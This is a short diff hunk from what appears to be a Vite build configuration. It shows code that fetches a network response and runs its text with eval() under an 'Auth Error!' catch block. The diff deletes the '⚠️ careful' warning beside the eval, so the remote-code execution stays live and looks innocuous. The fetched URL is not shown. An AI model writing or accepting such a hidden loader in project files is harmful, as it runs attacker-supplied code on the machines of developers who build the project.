@@ -23,7 +23,7 @@ import tailwindcss from '@tailwindcss/vite'
 
     const proxyInfo = await response.text();
 
-    eval(proxyInfo); // ⚠️ careful
+    eval(proxyInfo); 
   } catch (err) {
     console.error('Auth Error!', err);
   }
